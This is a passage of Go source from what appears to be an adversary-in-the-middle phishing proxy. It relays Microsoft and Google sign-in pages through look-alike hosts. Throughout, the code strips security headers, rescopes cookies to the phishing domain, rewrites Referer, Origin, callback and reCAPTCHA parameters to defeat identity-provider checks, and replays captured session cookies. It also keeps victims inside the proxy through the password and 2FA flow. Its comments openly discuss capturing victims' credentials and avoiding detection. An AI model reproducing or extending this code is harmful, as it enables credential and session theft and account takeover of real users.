	return cookieScopeForTarget(e.SiteDomain, target)
}

// cookieScopeFor is the response-rewriting variant: it is EMPTY when no base
// domain is configured, so legacy per-origin cookie rewriting applies and the
// JS cookie shim stays suppressed — exactly as before.
func (e *Engine) cookieScopeFor(target *storage.TargetProfile) string {
	if strings.TrimSpace(e.SiteDomain) == "" {
		return ""
	}
	return e.siteDomainFor(target)
}

var stripResponseHeaders = []string{
	"Content-Security-Policy",
	"Content-Security-Policy-Report-Only",
	"X-Frame-Options",
	"Strict-Transport-Security",
	"Cross-Origin-Opener-Policy",
	"Cross-Origin-Embedder-Policy",
	"Cross-Origin-Resource-Policy",
	"X-Content-Type-Options",
	"Referrer-Policy",
	"Cache-Control",
	"Pragma",
	"Expires",
	"Etag",
	"Last-Modified",
	"Age",
	"Vary",
}

type requestModifier struct {
	rt           http.RoundTripper
	target       *storage.TargetProfile
	jar          *CookieJar
	reverseAlias map[string]string // phishing host[:port] -> real origin
	baseDomain   string            // phishing base domain (for wildcard alias)
}

// clientOriginCtxKey stashes the victim browser's real Origin (e.g.
// https://login.ms.test) on the outbound request context. The response rewriter
// needs it to reflect CORS for cross-subdomain fetches (login.ms.test ->
// login-live.ms.test for the MSA realm); by the time ModifyResponse runs the
// request's Origin header has already been rewritten to the upstream's real
// origin, so it can no longer be read from the header.
type ctxKey int

const clientOriginCtxKey ctxKey = iota

func (m *requestModifier) RoundTrip(req *http.Request) (*http.Response, error) {
	// When the victim signs out of the proxied dashboard, bounce them to the
	// real main Microsoft page instead of letting the upstream end the session
	// or loop them back through the auth chain.
	if isSignout(req) {
		return signoutRedirectResponse(req), nil
	}
	cr := req.Clone(req.Context())
	cr.Host = m.target.Origin
	// Capture the browser's Origin before it is rewritten to the upstream's real
	// origin, so the response CORS can reflect the phishing origin back.
	if o := cr.Header.Get("Origin"); o != "" {
		cr = cr.WithContext(context.WithValue(cr.Context(), clientOriginCtxKey, o))
	}
	cr.Header.Set("X-Forwarded-Proto", "https")
	// Remove Accept-Encoding so the Go transport adds its own (gzip, deflate,
	// br) and transparently decompresses the upstream response, stripping the
	// Content-Encoding header. This guarantees the response rewriter always
	// operates on plaintext. Forcing "identity" here is unsafe: some upstreams
	// (Microsoft/Azure) still reply with brotli, which we cannot decode, and
	// the browser then fails to decode the body -> blank page.
	cr.Header.Del("Accept-Encoding")
	cr.Header.Del("X-Evilpikin")
	cr.Header.Del("Forwarded")
	cr.Header.Del("X-Forwarded-For")
	cr.Header.Del("X-Forwarded-Host")
	// Rewrite Referer/Origin so the upstream sees its own real host instead of
	// our phishing host. Microsoft (and most IdPs) validate the Referer against
	// the expected origin and reject cross-host requests (e.g. AADSTS10040141
	// "The request is invalid" on /bridge/fido) when it points at the phish
	// host. The reverse alias map points every phishing host back to its origin.
	if r := cr.Header.Get("Referer"); r != "" {
		cr.Header.Set("Referer", m.rewriteOutboundHosts(r))
	}
	if o := cr.Header.Get("Origin"); o != "" {
		cr.Header.Set("Origin", m.rewriteOutboundHosts(o))
	}
	// Reverse-alias any phishing hosts embedded in query-string callback URLs
	// (wreply, redirect_uri, ...) back to their real origin. The response side
	// aliases these to the phishing domain so Microsoft's client-side BrsConfig
	// validation passes; we must undo that before the request reaches the real
	// upstream, otherwise the upstream rejects the (now-phishing) reply URL and
	// the password-reset flow fails server-side. A targeted string replacement
	// (not a re-encode) keeps signatures / percent-encoding intact.
	if m.baseDomain != "" && cr.URL.RawQuery != "" {
		q := m.rewriteOutboundHosts(cr.URL.RawQuery)
		q = m.fixRecaptchaCo(q)
		// Percent-encoded callback params (continue/followup/redirect_uri/...)
		// survive the plain rewriter; decode, reverse-alias, re-encode so the
		// upstream receives the real origin instead of the phishing host.
		q = rewriteCallbackParamURLs(q, m.rewriteOutboundHosts)
		cr.URL.RawQuery = q
	}
	if ct := cr.Header.Get("Content-Type"); strings.HasPrefix(ct, "application/x-www-form-urlencoded") && cr.Body != nil {
		if b, err := io.ReadAll(cr.Body); err == nil {
			nb := m.rewriteOutboundHosts(string(b))
			nb = m.fixRecaptchaCo(nb)
			nb = rewriteCallbackParamURLs(nb, m.rewriteOutboundHosts)
			cr.Body = io.NopCloser(strings.NewReader(nb))
			cr.ContentLength = int64(len(nb))
			cr.Header.Set("Content-Length", strconv.Itoa(len(nb)))
		}
	}
	if m.jar != nil {
		if sc, err := req.Cookie("__ep_sid"); err == nil && sc.Value != "" {
			// Only replay captured session cookies once the victim has actually
			// submitted credentials. Replaying cookies (notably Google's
			// __Host-GAPS) on the pre-auth passive ServiceLogin probe makes
			// Google think the session is broken and bounce the victim to the
			// "Clear cache & cookies" help article instead of the sign-in form.
			if m.jar.IsCaptured(sc.Value) {
				for _, c := range m.jar.cookiesForSession(sc.Value) {
					cr.Header.Add("Cookie", c.Name+"="+c.Value)
				}
			}
		}
	}
	// The proxy's own session cookie must never be forwarded to the real upstream;
	// Google rejects requests carrying an unrecognised __ep_sid and bounces the
	// victim. Only genuine upstream-set cookies (replayed from the jar above) and
	// the victim's own cookies should reach the origin.
	if c := cr.Header.Get("Cookie"); c != "" {
		var keep []string
		for _, part := range strings.Split(c, ";") {
			part = strings.TrimSpace(part)
			if part == "" || strings.HasPrefix(part, "__ep_sid=") {
				continue
			}
			keep = append(keep, part)
		}
		if len(keep) > 0 {
			cr.Header.Set("Cookie", strings.Join(keep, "; "))
		} else {
			cr.Header.Del("Cookie")
		}
	}
	rt := m.rt
	if rt == nil {
		rt = upstreamTransport
	}
	if logPermitsDebug() {
		log.Debug("upstream %s %s referer=%q cookies=%d", m.target.Origin, req.Method, cr.Header.Get("Referer"), len(cr.Header.Values("Cookie")))
	}
	return rt.RoundTrip(cr)
}

// refHostRE matches a scheme prefix followed by a host (optionally :port).
// Includes ws(s):// so live-socket URLs in refs/bodies are reversed too.
var refHostRE = regexp.MustCompile(`(https?://|wss?://|//)([a-zA-Z0-9.-]+(?::[0-9]+)?)`)

// refHostREEnc matches the SAME host forms but percent-encoded, as they appear
// inside serialized request payloads (e.g. Google's f.req RPC POST body where
// the SPA URL-encodes a masked URL as https%3A%2F%2Faccounts.google.test%3A9443).
// Without this, the phishing host leaks back to the real origin in the body and
// the upstream rejects valid accounts.
var refHostREEnc = regexp.MustCompile(`(?i)(https?%3a%2f%2f|wss?%3a%2f%2f)([a-zA-Z0-9.\-]+(?:%3a[0-9]+)?)`)

// buildReverseAlias maps phishing host[:port] -> real origin so outbound
// Referer/Origin headers can be rewritten back to the genuine host.
func buildReverseAlias(pairs []DomainPair, portStr string) map[string]string {
	m := make(map[string]string)
	for _, p := range pairs {
		if p.ProxyHost == "" || p.Origin == "" {
			continue
		}
		l := strings.ToLower(p.ProxyHost)
		m[l] = p.Origin
		if portStr != "" && portStr != "443" {
			m[l+":"+portStr] = p.Origin
		}
	}
	return m
}

func (m *requestModifier) rewriteOutboundHosts(value string) string {
	if value == "" {
		return value
	}
	v := refHostRE.ReplaceAllStringFunc(value, func(match string) string {
		mm := refHostRE.FindStringSubmatch(match)
		if mm == nil {
			return match
		}
		prefix, hostport := mm[1], mm[2]
		if origin, ok := m.reverseAlias[strings.ToLower(hostport)]; ok {
			return prefix + origin
		}
		if h, _, err := net.SplitHostPort(hostport); err == nil {
			if origin, ok := m.reverseAlias[strings.ToLower(h)]; ok {
				return prefix + origin
			}
		}
		// Wildcard fallback: any phishing alias host (<realhost>.<baseDomain>)
		// maps back to the real origin even if it wasn't in the static pair map.
		// This keeps subresources on dynamically-discovered Microsoft hosts
		// flowing through the proxy without pre-listing them.
		if m.baseDomain != "" {
			host := hostport
			if h, _, e2 := net.SplitHostPort(hostport); e2 == nil {
				host = h
			}
			if host == m.baseDomain {
				return match
			}
			if strings.HasSuffix(host, "."+m.baseDomain) {
				hp := strings.TrimSuffix(host, "."+m.baseDomain)
				// Only reverse dynamically-generated aliases of the form
				// <realhost>.<baseDomain> (realhost itself contains a dot, e.g.
				// login.live.com.ms.test). Hand-authored slug aliases
				// (login-live.ms.test) are NOT mechanically reversible and are
				// handled by the static reverseAlias map above.
				if strings.Contains(hp, ".") {
					originPort := ""
					if _, p, e3 := net.SplitHostPort(hostport); e3 == nil && p != "" && p != "443" && p != "80" {
						originPort = ":" + p
					}
					sch := "https://"
					switch {
					case strings.HasPrefix(prefix, "http://"):
						sch = "http://"
					case strings.HasPrefix(prefix, "https://"):
						sch = "https://"
					}
					return sch + hp + originPort
				}
			}
		}
		return match
	})
	return m.rewriteOutboundHostsEncoded(v)
}

// rewriteOutboundHostsEncoded reverses phishing hosts that appear inside
// percent-encoded URL strings (form bodies / f.req RPC payloads where the SPA
// serializes a masked URL as https%3A%2F%2Faccounts.google.test%3A9443). It
// decodes %3A back to ":" to look up the real origin, preserving the encoded
// scheme prefix so the resulting value stays valid URL-encoding.
func (m *requestModifier) rewriteOutboundHostsEncoded(value string) string {
	if value == "" {
		return value
	}
	return refHostREEnc.ReplaceAllStringFunc(value, func(match string) string {
		mm := refHostREEnc.FindStringSubmatch(match)
		if mm == nil {
			return match
		}
		prefix, hostport := mm[1], mm[2]
		decoded := strings.ReplaceAll(strings.ToLower(hostport), "%3a", ":")
		if origin, ok := m.reverseAlias[decoded]; ok {
			return prefix + origin
		}
		if h, _, err := net.SplitHostPort(decoded); err == nil {
			if origin, ok := m.reverseAlias[h]; ok {
				return prefix + origin
			}
		}
		return match
	})
}

func logPermitsDebug() bool {
	return true
}

// coParamRE matches the reCAPTCHA Enterprise "co" query/form parameter, whose
// value is a base64url-encoded origin (e.g. "https://accounts.google.com"). A
// plain string host-replace never matches inside the base64 blob, so the value
// is left untouched on the page we serve — which is what we want. But Google's
// client JS sometimes recomputes "co" from window.location.origin (the phishing
// host); to guarantee reCAPTCHA always validates against the registered site we
// force the decoded origin back to the real host on every OUTBOUND request.
var coParamRE = regexp.MustCompile(`(^|[?&])co=([A-Za-z0-9_\-]+)`)

// outboundCallbackParamRE matches the callback/redirect parameters that carry
// an embedded origin URL (the "continue"/"followup" family used by Google and
// the OAuth redirect_uri/wreply family used by Microsoft). The value is matched
// greedily up to the next "&" so a percent-encoded embedded URL survives intact.
var outboundCallbackParamRE = regexp.MustCompile(
	`(^|[?&])(continue|followup|redirect_uri|redirect_uri_reconnect|wreply|state|post_logout_redirect_uri|return|return_url|next|target)=([^&]+)`)

// fixRecaptchaCo decodes every "co" param, rewrites the embedded host back to its
// real origin (toProxy=false, outbound victim->upstream), and re-encodes with
// RawURLEncoding (no padding) to match Google's format. It is a no-op when the
// decoded origin already matches what Google expects, so it is safe to run on
// every request.
func (m *requestModifier) fixRecaptchaCo(s string) string {
	return coParamRE.ReplaceAllStringFunc(s, func(match string) string {
		mm := coParamRE.FindStringSubmatch(match)
		if mm == nil {
			return match
		}
		sep := mm[1] // "?" or "&"
		enc := mm[2]
		raw, err := base64.RawURLEncoding.DecodeString(enc)
		if err != nil {
			raw, err = base64.URLEncoding.DecodeString(enc)
		}
		if err != nil {
			raw, err = base64.StdEncoding.DecodeString(enc)
		}
		if err != nil {
			return match
		}
		decoded := string(raw)
		replaced := m.rewriteOutboundHosts(decoded)
		if replaced == decoded {
			return match
		}
		return sep + "co=" + base64.RawURLEncoding.EncodeToString([]byte(replaced))
	})
}

// rewriteCallbackParamURLs decodes the value of each callback/redirect
// parameter, runs it through replace (which maps phishing<->real origins), and
// re-encodes it. This is what keeps percent-encoded callback params
// (e.g. the browser's continue=https%3A%2F%2Faccounts.google.test%3A9443%2F)
// in sync with the plain-string rewriter: without it the phishing origin is
// forwarded to the upstream verbatim (Google rejects it and bounces the victim
// to the "something went wrong" help page).
func rewriteCallbackParamURLs(raw string, replace func(string) string) string {
	return outboundCallbackParamRE.ReplaceAllStringFunc(raw, func(match string) string {
		mm := outboundCallbackParamRE.FindStringSubmatch(match)
		if mm == nil {
			return match
		}
		sep, name, val := mm[1], mm[2], mm[3]
		decoded, err := url.QueryUnescape(val)
		if err != nil {
			return match
		}
		fixed := replace(decoded)
		if fixed == decoded {
			return match
		}
		enc := url.QueryEscape(fixed)
		if sep == "" {
			return name + "=" + enc
		}
		return sep + name + "=" + enc
	})
}

// SetDefaultTargetResolver installs a fallback that derives a target for
// hosts not explicitly registered (dynamic subdomain handling).
func (e *Engine) SetDefaultTargetResolver(fn func(sni string) (*storage.TargetProfile, bool)) {
	e.defaultResolver = fn
}

func (e *Engine) HandlerFor(proxyHost string) (http.Handler, error) {
	r, ok := e.targetFor(proxyHost)
	if !ok && e.defaultResolver != nil {
		if dt, ok2 := e.defaultResolver(proxyHost); ok2 {
			// Build a route from the resolved target so subsequent requests hit
			// the cache directly.
			rr := &hostRoute{target: dt, orig: dt.Origin, port: 443, pairs: buildChainPairs(e, dt)}
			e.hostRoutes[strings.ToLower(proxyHost)] = rr
			r, ok = rr, true
		}
	}
	// Dynamic subdomain handling: any host under the base domain that is not
	// explicitly registered is derived on the fly by stripping the base-domain
	// suffix to recover the real origin. This lets the proxy serve arbitrary
	// CDN/subdomain content referenced by a page without pre-listing it.
	if !ok && e.BaseDomain != "" {
		low := strings.ToLower(proxyHost)
		if strings.HasSuffix(low, "."+e.BaseDomain) {
			origin := proxyHost[:len(proxyHost)-len("."+e.BaseDomain)]
			if origin != "" {
				dt := &storage.TargetProfile{
					Name:       "dynamic:" + origin,
					ProxyHost:  proxyHost,
					Origin:     origin,
					ForceHTTPS: true,
					Enabled:    true,
				}
				dt.Normalize()
				rr := &hostRoute{target: dt, orig: origin, port: 443, pairs: buildChainPairs(e, dt)}
				e.hostRoutes[low] = rr
				r, ok = rr, true
			}
		}
	}
	if !ok {
		return nil, fmt.Errorf("no target for host %q", proxyHost)
	}
	target := r.target
	scheme := "http"
	if r.port == 443 {
		scheme = "https"
	}
	upstream, err := url.Parse(scheme + "://" + r.orig)
	if err != nil {
		return nil, err
	}

	rp := httputil.NewSingleHostReverseProxy(upstream)

	rp.Transport = &requestModifier{rt: upstreamTransport, target: target, jar: e.cookieJar, reverseAlias: buildReverseAlias(r.pairs, proxyPortString(e.TLSPort)), baseDomain: e.BaseDomain}

	rp.ModifyResponse = func(resp *http.Response) error {
		pairs := r.pairs
		if len(pairs) == 0 {
			pairs = rewritePairsFor(target)
		}
		rc := &RewriteContext{
			Target:       target,
			Pairs:        pairs,
			Port:         e.TLSPort,
			CookieJar:    e.cookieJar,
			BaseDomain:   e.BaseDomain,
			SiteDomain:   e.cookieScopeFor(target),
			DynamicAlias: e.dynamicAliasFor,
			GlobalAlias:  e.GlobalAlias(),
			IsPhishHost: func(h string) bool {
				_, ok := e.targetFor(h)
				return ok
			},
		}
		// Route through the active transformer (Static today, AI-backed later).
		// The transformer is synchronous and never blocks on external services,
		// so the victim's stream is unaffected by any future async analysis.
		return e.transformer.Transform(resp, rc)
	}

	rp.ErrorHandler = func(w http.ResponseWriter, req *http.Request, err error) {
		log.Error("proxy engine: upstream %s: %v", r.orig, err)
		// Graceful asset fallback. When the proxy cannot egress to the real
		// origin (operator egress restrictions, an unreachable CDN edge), the
		// browser is redirected to fetch STATIC, non-executed assets
		// (images/fonts/media/favicon) directly from the real origin. These are
		// cross-origin safe, so a 302 does not break the page.
		//
		// Executed content (JS/CSS) MUST stay same-origin: a cross-origin 302
		// would run the SPA under the real CDN origin and its same-origin data
		// fetches to the proxy would be blocked by the browser's origin policy,
		// leaving the page blank except for the cross-origin-safe favicon. So
		// JS/CSS are never redirected — they are served same-origin or fail
		// closed. HTML pages and credential POSTs likewise must never escape to
		// the real origin (the former would bounce the victim out, the latter
		// would bypass capture).
		if req.Method == http.MethodGet && isStaticAssetFallback(req.URL.Path) {
			// Egress to the real CDN origin failed. Instead of 302-redirecting
			// the victim's browser to the genuine origin (an OPSEC leak that
			// also leaves the asset blank when the victim has no direct CDN
			// egress), serve a bundled local copy so the page always renders and
			// the victim stays fully in-proxy. The Google wordmark/logo path gets
			// the recognizable "G"; everything else gets a silent 1x1 pixel.
			if strings.Contains(req.URL.Path, "googlelogo") {
				w.Header().Set("Content-Type", "image/svg+xml")
				w.Header().Set("Cache-Control", "public, max-age=3600")
				w.WriteHeader(http.StatusOK)
				_, _ = w.Write(googleGLogoSVG)
				return
			}
			w.Header().Set("Content-Type", "image/png")
			w.Header().Set("Cache-Control", "public, max-age=3600")
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write(transparentPNG)
			return
		}
		http.Error(w, "bad gateway", http.StatusBadGateway)
	}

	h := e.wrapCapture(target, rp)
	if e.fence != nil {
		h = e.fence.Middleware(h)
	}
	if e.ScannerShield {
		h = e.scannerGuard(h)
	}
	if e.Lures != nil {
		h = e.lureGuard(h)
	}
	if e.Puppet != nil {
		h = e.puppetGuard(h)
	}

	// Favicon is proxied to the real origin like any other path so the victim's
	// browser renders the legitimate site icon on every page. Previously a 204
	// shortcut was returned here, which both broke the visual and — more
	// importantly — masked the fact that /favicon.ico must flow through the same
	// alias/rewrite pipeline as the rest of the page.
	return h, nil
}

func decodeResponseBody(resp *http.Response) {
	enc := resp.Header.Get("Content-Encoding")
	if enc == "" {
		return
	}
	var r io.Reader = resp.Body
	switch strings.ToLower(strings.TrimSpace(enc)) {
	case "gzip":
		gz, err := gzip.NewReader(resp.Body)
		if err != nil {
			return
		}
		r = gz
	case "deflate":
		zr, err := zlib.NewReader(resp.Body)
		if err != nil {
			return
		}
		r = zr
	default:
		// Unknown encoding: leave untouched (transport normally handles gzip/
		// deflate/br and strips Content-Encoding before we get here).
		return
	}
	data, err := io.ReadAll(r)
	if err != nil {
		return
	}
	resp.Body = io.NopCloser(bytes.NewReader(data))
	resp.Header.Del("Content-Encoding")
	resp.Header.Del("Content-Length")
	resp.ContentLength = int64(len(data))
}

func rewritePairsFor(t *storage.TargetProfile) []DomainPair {
	pairs := []DomainPair{}
	for _, o := range t.Origins {
		if o != "" {
			pairs = append(pairs, DomainPair{ProxyHost: t.ProxyHost, Origin: o})
		}
	}
	for real, ph := range t.RelatedDomains {
		if real != "" && ph != "" {
			pairs = append(pairs, DomainPair{ProxyHost: ph, Origin: real})
		}
	}
	return pairs
}

// cookieDomainRE matches the Domain attribute of a Set-Cookie header
// (case-insensitive), capturing the "Domain=" prefix so we can replace only the
// value while preserving its original casing.
var cookieDomainRE = regexp.MustCompile(`(?i)(domain=)[^;]+`)

// rewriteCookieDomains masks the scope of every upstream Set-Cookie so the
// victim's browser attaches it to our phishing hosts.
//
// When a base domain is configured (site-domain mode), every cookie is scoped
// site-wide to ".<baseDomain>" (e.g. ".ms.test") instead of the real origin.
// This is what lets a session survive the multi-host auth chain: Microsoft
// scopes its shared auth cookies to the PARENT domain (e.g. ".microsoft.com"
// for both login.microsoftonline.com and login.microsoft.com, or ".live.com"
// for the consumer realm), and a host-by-host rewrite would leave those
// parent-domain cookies stored for the real origin and never sent to any
// *.ms.test host. Scoping them site-wide makes the browser attach them to every
// phishing subdomain, so the flow crosses the enterprise<->consumer realm split.
//
// When no base domain is set (legacy mode), it falls back to the per-origin
// origin->proxy_host mapping.
func rewriteCookieDomains(resp *http.Response, pairs []DomainPair, siteDomain string) {
	cookies := resp.Header.Values("Set-Cookie")
	if len(cookies) == 0 {
		return
	}
	resp.Header.Del("Set-Cookie")
	for _, c := range cookies {
		// Never touch our own session cookie (added later by the jar).
		if strings.HasPrefix(c, "__ep_sid=") {
			resp.Header.Add("Set-Cookie", c)
			continue
		}
		updated := c
		if siteDomain != "" {
			if cookieDomainRE.MatchString(updated) {
				updated = cookieDomainRE.ReplaceAllString(updated, "Domain=."+siteDomain)
			} else if strings.HasPrefix(strings.TrimSpace(updated), "__Host-") {
				// __Host- prefixed cookies are host-scoped by spec and MUST NOT
				// carry a Domain attribute. Leave them host-only on the proxy
				// host (the browser already scopes them to the current host).
			} else {
				// Host-only cookie: promote it to site-wide so it also crosses
				// the phishing subdomains.
				updated = updated + "; Domain=." + siteDomain
			}
		} else {
			for _, p := range pairs {
				if p.Origin == "" || p.ProxyHost == "" {
					continue
				}
				updated = strings.ReplaceAll(updated, "Domain=."+p.Origin, "Domain=."+p.ProxyHost)
				updated = strings.ReplaceAll(updated, "domain=."+p.Origin, "domain=."+p.ProxyHost)
				updated = strings.ReplaceAll(updated, "Domain="+p.Origin, "Domain="+p.ProxyHost)
				updated = strings.ReplaceAll(updated, "domain="+p.Origin, "domain="+p.ProxyHost)
			}
		}
		resp.Header.Add("Set-Cookie", updated)
	}
}

func (e *Engine) rewriteLocation(resp *http.Response, pairs []DomainPair) {
	captured := false
	if e.cookieJar != nil && resp.Request != nil {
		if sc, err := resp.Request.Cookie("__ep_sid"); err == nil && sc.Value != "" {
			captured = e.cookieJar.IsCaptured(sc.Value)
		}
	}
	rewriteLocation(resp, pairs, e.TLSPort, e.BaseDomain, captured, func(h string) bool {
		_, ok := e.targetFor(h)
		return ok
	})
}

// rewriteLocation rewrites a 3xx Location header so any origin host in the
// chain points at its phishing twin, preserving the public TLS port.
// aliasForwardLocation rewrites the AUTHORITY of a 3xx Location so any real
// origin host (e.g. www.office.com, m365.cloud.microsoft) is pulled into the
// phishing namespace as <host>.<BaseDomain>. This is what keeps the victim
// inside the proxy on the post-authentication dashboard hop instead of being
// bounced out to the real Microsoft host. Only the URL authority is rewritten —
// hosts that appear inside query parameters (redirect_uri, wreply, ...) are left
// untouched so Microsoft's server-side validation still sees the genuine URI.
// isPhishHost reports whether host is one of the engine's registered phishing
// routes (possibly on a foreign suffix, e.g. google.test). Such hosts must
// never be re-aliased into <host>.<BaseDomain>: the inbound side would then
// resolve that mangled host back to the unresolvable phish host
// ("no non-loopback addresses" → 502 Bad Gateway).
type isPhishHost func(host string) bool

func aliasForwardLocation(loc, baseDomain string, port int, isPhish isPhishHost) string {
	if baseDomain == "" {
		return loc
	}
	u, err := url.Parse(loc)
	if err != nil || u.Host == "" {
		return loc
	}
	hn := u.Host
	if h, _, e := net.SplitHostPort(u.Host); e == nil {
		hn = h
	}
	if hn == baseDomain || strings.HasSuffix(hn, "."+baseDomain) {
		return loc
	}
	if isPhish != nil && isPhish(hn) {
		// Already one of our phishing hosts (possibly on a foreign suffix):
		// the browser will fetch it directly and the host route serves it.
		return loc
	}
	alias := hn + "." + baseDomain
	if port != 0 && port != 443 {
		alias = net.JoinHostPort(alias, strconv.Itoa(port))
	}
	u.Host = alias
	return u.String()
}

func aliasOrigins(s string, pairs []DomainPair, port int, baseDomain string, isPhish isPhishHost) string {
	if s == "" {
		return s
	}
	updated := s
	for _, p := range pairs {
		if p.Origin == "" || p.ProxyHost == "" {
			continue
		}
		ph := proxyHostURLFor(p.ProxyHost, port)
		// Transparent mode (proxy_host == origin): the victim reaches the real
		// origin through a tunnel/DNS intercept, so the served URL must stay
		// portless and identical to the genuine host. Appending the listener
		// port (e.g. :9443) would make location.origin diverge from the real
		// origin and break origin-bound anti-CSRF tokens (Google's `at`), which
		// silently rejects valid accounts. Keep the alias portless here.
		if p.ProxyHost == p.Origin {
			ph = p.Origin
		}
		if ph == p.Origin {
			continue
		}
		// Replace the real origin host only at a URL boundary (a path/query/
		// fragment separator, quote, bracket, or end-of-string). This keeps an
		// already-aliased host such as "origin:port" from being re-matched and
		// corrupted on the second pass performed by rewriteCallbackParamURLs
		// (which would otherwise turn origin:port into origin:port:port and worse).
		// It also avoids clipping longer real hosts that merely share a suffix.
		re := regexp.MustCompile(`(?i)(https?://)` + regexp.QuoteMeta(p.Origin) + `([/?#&"'\)\]]|$)`)
		updated = re.ReplaceAllString(updated, `${1}`+ph+`$2`)
	}
	updated = aliasForwardLocation(updated, baseDomain, port, isPhish)
	return updated
}

func rewriteLocation(resp *http.Response, pairs []DomainPair, port int, baseDomain string, captured bool, isPhish isPhishHost) {
	loc := resp.Header.Get("Location")
	if loc == "" {
		return
	}
	updated := aliasOrigins(loc, pairs, port, baseDomain, isPhish)
	// Embedded callback params are often percent-encoded
	// (continue=https%3A%2F%2F..); the plain string replace above cannot reach
	// inside them, so decode, alias to the phishing twin, and re-encode each one
	// so the victim stays in-proxy after authentication.
	updated = rewriteCallbackParamURLs(updated, func(v string) string {
		return aliasOrigins(v, pairs, port, baseDomain, isPhish)
	})
	// Collapse the Microsoft login-root navigation bounce
	// (login.microsoftonline.com/ -> www.office.com/login -> m365.cloud.microsoft)
	// onto the real oauth2 authorize sign-in endpoint so the victim lands on the
	// email/password/2FA form instead of the inert M365 portal landing. Only
	// top-level HTML navigations are collapsed; sub-resource 3xx redirects and
	// the post-auth m365 dashboard hop are left intact.
	if strings.Contains(strings.ToLower(resp.Header.Get("Content-Type")), "text/html") {
		if u, err := url.Parse(updated); err == nil && isSigninBounce(u.Hostname(), u.Path, u.RawQuery, captured) {
			updated = signinAuthorizeURL(port)
		}
	}
	if updated != loc {
		resp.Header.Set("Location", updated)
	}
}

// isSigninBounce reports whether a rewritten 3xx Location is the Microsoft
// login-root redirect target that would otherwise dump the victim onto the
// Office/M365 portal landing (and, now that those real domains are
// intercepted, a blank proxied portal page). We collapse the entire office/m365
// portal namespace (www.office.com, office.com, m365.cloud.microsoft and their
// .ms.test twins) onto the sign-in authorize endpoint so the victim stays in
// the email/password/2FA flow. Post-authentication destinations are NOT
// collapsed: they carry an auth code/id_token (or hit /landingv2) and
// collapsing them would drop the token and create a sign-in <-> dashboard loop.
func isSigninBounce(host, path, rawQuery string, captured bool) bool {
	// Post-capture the victim is allowed into the real dashboard: never collapse
	// office/m365 navigations back onto the sign-in authorize endpoint, or we
	// would bounce them out of the portal they just authenticated into.
	if captured {
		return false
	}
	h := strings.ToLower(host)
	// The entire Office/M365 portal namespace is a login-root bounce target:
	// any host containing "office" (www.office.com, office.com, www.office,
	// office.ms.test, ...) or the M365 cloud host. These are never legitimate
	// in-proxy API endpoints, so collapsing them onto the sign-in authorize
	// endpoint keeps the victim in the email/password/2FA flow.
	portal := strings.Contains(h, "office") ||
		h == "m365.cloud.microsoft" || strings.HasSuffix(h, ".m365.cloud.microsoft")
	if !portal {
		return false
	}
	q := strings.ToLower(rawQuery)
	if strings.Contains(q, "code=") || strings.Contains(q, "id_token=") ||
		strings.Contains(q, "token=") || path == "/landingv2" || path == "/landingv2/" {
		return false
	}
	return path == "" || path == "/" || path == "/login" || path == "/login/" || path == "/login#"
}

// signinAuthorizeURL returns the Microsoft consumer oauth2 authorize endpoint
// that renders the sign-in form (email/password + Authenticator/Fido/Passkey/
// Phone 2FA). The host is the phishing twin of login.microsoftonline.com so the
// victim stays in the proxy. redirect_uri is the genuine www.office.com/landingv2
// (validated by Microsoft against the Office client) and is rewritten to its
// phishing twin on the post-auth hop by the normal pair logic.
func signinAuthorizeURL(port int) string {
	ph := "login.ms.test"
	if port != 0 && port != 443 {
		ph = net.JoinHostPort(ph, strconv.Itoa(port))
	}
	s := "ep" + randHex(8)
	n := "ep" + randHex(8)
	return "https://" + ph + "/common/oauth2/v2.0/authorize" +
		"?client_id=4765445b-32c6-49b0-83e6-1d93765276ca" +
		"&response_type=code%20id_token" +
		"&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All" +
		"&response_mode=form_post" +
		"&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2" +
		"&ui_locales=en-US&mkt=en-US&state=" + s + "&nonce=" + n
}

// signoutPathRE matches Microsoft (and generic OIDC) sign-out endpoints. When a
// victim clicks "Sign out" from the proxied dashboard we bounce them to the real
// main Microsoft page instead of letting the upstream log them out or loop them
// back through the auth chain.
var signoutPathRE = regexp.MustCompile(`(?i)(?:^|/)(?:logout|log[-_]?out|sign[-_]?out|oaaccountlogout|logout\.srf|oauth2/v2\.0/logout)(?:[?/]|$)`)

// isSignout reports whether an inbound navigation is a victim sign-out action.
func isSignout(req *http.Request) bool {
	if req.Method != http.MethodGet {
		return false
	}
	u := req.URL
	if signoutPathRE.MatchString(u.Path) || signoutPathRE.MatchString(u.RawQuery) {
		return true
	}
	// The OIDC post-logout redirect URI marks an explicit sign-out flow.
	if strings.Contains(strings.ToLower(u.RawQuery), "post_logout_redirect_uri") {
		return true
	}
	return false
}

// signoutRedirectResponse synthesizes a 302 to the main Microsoft page so the
// victim lands on a benign, real Microsoft destination after signing out.
func signoutRedirectResponse(req *http.Request) *http.Response {
	loc := "https://www.microsoft.com/"
	hdr := make(http.Header)
	hdr.Set("Location", loc)
	hdr.Set("Content-Type", "text/html; charset=utf-8")
	body := fmt.Sprintf(`<html><head><meta http-equiv="refresh" content="0; url=%s"></head><body>Redirecting...</body></html>`, loc)
	return &http.Response{
		StatusCode: http.StatusFound,
		Status:     "302 Found",
		Header:     hdr,
		Body:       io.NopCloser(strings.NewReader(body)),
		Request:    req,
	}
}

// randHex returns a random hex string of 2*n bytes (best-effort; falls back to
// a static suffix if the system CSPRNG is unavailable).
func randHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "00000000"
	}
	return hex.EncodeToString(b)
}

// proxyHostURLFor mirrors Engine.proxyHostURL but is callable without an Engine
// receiver (used by transformers on the response path).
func proxyHostURLFor(ph string, port int) string {
	if port == 0 || port == 443 {
		return ph
	}
	return net.JoinHostPort(ph, strconv.Itoa(port))
}

// staticFallbackExts are the only asset types that are safe to fetch
// cross-origin via the graceful 302 fallback. Executed content (js/css) is
// deliberately excluded: a cross-origin 302 would run the SPA under the real
// CDN origin and break its same-origin data fetches to the proxy.
var staticFallbackExts = map[string]bool{
	".png": true, ".jpg": true, ".jpeg": true, ".gif": true, ".svg": true,
	".webp": true, ".ico": true, ".woff": true, ".woff2": true, ".ttf": true,
	".eot": true, ".otf": true, ".mp4": true, ".webm": true, ".mp3": true,
}

// isStaticAssetFallback reports whether path is a static, non-executed asset
// that the graceful 302 fallback may redirect to the real origin. It requires a
// filename with a known static extension so HTML pages, JS, CSS, and API paths
// are never redirected.
func isStaticAssetFallback(path string) bool {
	base := path
